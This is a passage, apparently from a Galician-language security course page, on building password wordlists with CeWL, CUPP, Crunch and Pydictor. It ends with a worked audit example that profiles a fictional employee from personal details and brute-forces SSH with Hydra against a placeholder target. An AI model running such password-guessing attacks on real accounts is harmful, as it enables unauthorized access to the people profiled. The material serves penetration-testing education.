+<td>Contrasinais con estrutura coñecida</td>
+<td>Flexible, rápida</td>
+<td>Pode xerar ficheiros masivos</td>
+</tr>
+<tr>
+<td><strong>CUPP</strong></td>
+<td>Perfil de vítima</td>
+<td>Enxeñería social</td>
+<td>Moi efectiva con OSINT</td>
+<td>Require información previa</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="workflow-recomendado-para-xeracion-de-wordlists">Workflow recomendado para xeración de wordlists</h3>
+<ol>
+<li><strong>OSINT e recopilación</strong>: Identifica información sobre o obxectivo (nomes, datas, intereses, páxinas web).</li>
+<li><strong>Extracción con CeWL</strong>: Xera unha wordlist base desde o sitio web do obxectivo.</li>
+<li><strong>Perfilado con CUPP</strong>: Crea variantes baseadas en información persoal (se dispoñible).</li>
+<li><strong>Patróns con Crunch</strong>: Se coñeces a estrutura do contrasinal (ex: 2 letras + 4 números), xera combinacións específicas.</li>
+<li><strong>Combinacións con Pydictor</strong>: Combina palabras base con regras avanzadas, datas, sufixos comúns, etc.</li>
+<li><strong>Optimización final</strong>: Elimina duplicados e ordea por probabilidade:
+   <div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>sort<span class="w"> </span>-u<span class="w"> </span>wordlist.txt<span class="w"> </span>-o<span class="w"> </span>wordlist_unique.txt
+</span></code></pre></div></li>
+</ol>
+<div class="admonition example">
+<p class="admonition-title">Exemplo práctico completo</p>
+<p>Supoñamos que estamos auditando unha empresa chamada <strong>TechCorp</strong> e identificamos un usuario chamado <strong>xan.perez</strong> cunha mascota chamada <strong>Max</strong> e data de nacemento <strong>1990</strong>.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="c1"># Paso 1: Extraer palabras da web da empresa</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>cewl<span class="w"> </span>https://techcorp.com<span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>-m<span class="w"> </span><span class="m">6</span><span class="w"> </span>-w<span class="w"> </span>/tmp/techcorp_words.txt
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="c1"># Paso 2: Xerar perfil con CUPP (saída: xan.txt)</span>
+</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>cupp<span class="w"> </span>-i
+</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a><span class="c1"># Nome: Xan</span>
+</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a><span class="c1"># Apelidos: Perez</span>
+</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a><span class="c1"># Mascota: Max</span>
+</span><span id="__span-44-9"><a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a><span class="c1"># Ano nacemento: 1990</span>
+</span><span id="__span-44-10"><a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a><span class="c1"># (saída: xan.txt)</span>
+</span><span id="__span-44-11"><a id="__codelineno-44-11" name="__codelineno-44-11" href="#__codelineno-44-11"></a>
+</span><span id="__span-44-12"><a id="__codelineno-44-12" name="__codelineno-44-12" href="#__codelineno-44-12"></a><span class="c1"># Paso 3: Xerar sufixos numéricos con Crunch</span>
+</span><span id="__span-44-13"><a id="__codelineno-44-13" name="__codelineno-44-13" href="#__codelineno-44-13"></a>crunch<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="m">0123456789</span><span class="w"> </span>-o<span class="w"> </span>/tmp/numbers.txt
+</span><span id="__span-44-14"><a id="__codelineno-44-14" name="__codelineno-44-14" href="#__codelineno-44-14"></a>
+</span><span id="__span-44-15"><a id="__codelineno-44-15" name="__codelineno-44-15" href="#__codelineno-44-15"></a><span class="c1"># Paso 4: Combinar palabras base (CeWL + CUPP) con sufixos numéricos (Crunch)</span>
+</span><span id="__span-44-16"><a id="__codelineno-44-16" name="__codelineno-44-16" href="#__codelineno-44-16"></a><span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>word<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-44-17"><a id="__codelineno-44-17" name="__codelineno-44-17" href="#__codelineno-44-17"></a><span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>suf<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-44-18"><a id="__codelineno-44-18" name="__codelineno-44-18" href="#__codelineno-44-18"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">word</span><span class="si">}${</span><span class="nv">suf</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span id="__span-44-19"><a id="__codelineno-44-19" name="__codelineno-44-19" href="#__codelineno-44-19"></a><span class="w">  </span><span class="k">done</span><span class="w"> </span>&lt;<span class="w"> </span>/tmp/numbers.txt
+</span><span id="__span-44-20"><a id="__codelineno-44-20" name="__codelineno-44-20" href="#__codelineno-44-20"></a><span class="k">done</span><span class="w"> </span>&lt;<span class="w"> </span>&lt;<span class="o">(</span>cat<span class="w"> </span>/tmp/techcorp_words.txt<span class="w"> </span>xan.txt<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/final_wordlist.txt
+</span><span id="__span-44-21"><a id="__codelineno-44-21" name="__codelineno-44-21" href="#__codelineno-44-21"></a>
+</span><span id="__span-44-22"><a id="__codelineno-44-22" name="__codelineno-44-22" href="#__codelineno-44-22"></a><span class="c1"># Paso 5: Eliminar duplicados e xerar o dicionario final</span>
+</span><span id="__span-44-23"><a id="__codelineno-44-23" name="__codelineno-44-23" href="#__codelineno-44-23"></a>sort<span class="w"> </span>-u<span class="w"> </span>/tmp/final_wordlist.txt<span class="w"> </span>-o<span class="w"> </span>/labs/wordlists/techcorp_audit.txt
+</span><span id="__span-44-24"><a id="__codelineno-44-24" name="__codelineno-44-24" href="#__codelineno-44-24"></a>
+</span><span id="__span-44-25"><a id="__codelineno-44-25" name="__codelineno-44-25" href="#__codelineno-44-25"></a><span class="c1"># Paso 6: Probar o dicionario contra SSH con Hydra</span>
+</span><span id="__span-44-26"><a id="__codelineno-44-26" name="__codelineno-44-26" href="#__codelineno-44-26"></a>hydra<span class="w"> </span>-l<span class="w"> </span>xan.perez<span class="w"> </span>-P<span class="w"> </span>/labs/wordlists/techcorp_audit.txt<span class="w"> </span>ssh://&lt;TARGET&gt;
+</span></code></pre></div>
+</div>
+<hr />
+<p><a id="créditos-e-bibliografía-curta"></a></p>
+<h2 id="creditos-e-bibliografia">Créditos e bibliografía</h2>
+<ul>
+<li>
+<p>Documentación oficial ferramentas:    </p>
+<ul>
+<li>
+<p><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank">Hydra (THC Hydra)</a></p>
+</li>
+<li>
+<p><a href="https://www.openwall.com/john/" target="_blank">John the Ripper</a></p>
+</li>
+<li>
+<p><a href="https://hashcat.net/hashcat/" target="_blank">Hashcat</a></p>
+</li>
+<li>
+<p><strong>CeWL</strong>: <a href="https://github.com/digininja/CeWL" target="_blank">https://github.com/digininja/CeWL</a></p>
+</li>
+<li>
+<p><strong>Crunch</strong>: <a href="https://sourceforge.net/projects/crunch-wordlist/" target="_blank">https://sourceforge.net/projects/crunch-wordlist/</a></p>
+</li>
+<li>
+<p><strong>CUPP</strong>: <a href="https://github.com/Mebus/cupp" target="_blank">https://github.com/Mebus/cupp</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html" target="_blank">OWASP Authentication Cheat Sheet</a></p>
+</li>
+<li>
+<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html" target="_blank">OWASP Password Storage Cheat Sheet</a></p>
+</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver ao principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy", "content.code.select", "content.code.annotate", "navigation.tabs", "navigation.tabs.sticky", "navigation.top"], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado no cortapapeis", "clipboard.copy": "Copiar no cortapapeis", "search.result.more.one": "1 m\u00e1is nesta p\u00e1xina", "search.result.more.other": "# m\u00e1is nesta p\u00e1xina", "search.result.none": "Sen resultados", "search.result.one": "1 resultado atopado", "search.result.other": "# resultados atopados", "search.result.placeholder": "Insira un termo", "search.result.term.missing": "Falta", "select.version": "Seleccionar version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+        <script src="../../../js/medium-zoom.min.js"></script>
+      
+        <script src="../../../js/opera.js"></script>
+      
+        <script src="../../../js/zoom.js"></script>
+      
+    
+  </body>
+</html>
